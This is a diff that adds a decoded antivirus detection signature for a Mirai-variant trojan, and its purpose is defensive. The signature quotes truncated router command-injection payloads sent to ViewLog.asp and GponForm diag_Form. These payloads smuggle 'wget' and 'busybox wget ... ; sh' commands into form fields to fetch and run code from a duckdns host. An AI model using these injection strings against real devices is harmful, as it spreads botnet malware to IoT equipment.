@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Mirai-9856973-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: (0|1)&(2&3&4)
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+remote_submit_Flag=1&remote_syslog_Flag=1&RemoteSyslogSupported=1&LogFlag=0&remote_host=%3bcd+/tmp;wget+http://13scan.duckdns.o
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+POST /cgi-bin/ViewLog.asp HTTP/1.1
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+User-Agent: Hello, World
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+POST /GponForm/diag_Form?style/ HTTP/1.1
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://13scan.duckdns.org/cache+-O+/tmp/.gaf;sh+/tmp/.g
